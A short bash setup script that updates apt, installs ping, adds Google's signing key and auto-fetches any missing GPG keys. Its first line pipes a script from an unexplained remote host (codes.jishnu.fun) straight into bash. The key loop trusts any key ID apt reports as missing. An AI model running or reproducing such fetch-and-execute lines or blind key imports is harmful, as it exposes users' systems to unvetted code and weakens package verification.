 bash <(curl -s https://codes.jishnu.fun) 
apt update && apt install -y iputils-ping
wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | apt-key add -
apt update
# 🔧 Pre-flight check for missing GPG keys
missing_keys=$(apt-get update 2>&1 | grep NO_PUBKEY | awk '{print $NF}')
if [ -n "$missing_keys" ]; then
  echo "⚠️ Missing GPG keys detected: $missing_keys"
  for key in $missing_keys; do
    echo "➡️ Auto-fetching key $key..."
    apt-key adv --keyserver keyserver.ubuntu.com --recv-keys $key || {
      echo "❌ Failed to fetch key $key. Please check network."
    }
  done
  apt-get update
else
  echo "✅ No missing GPG keys."
fi
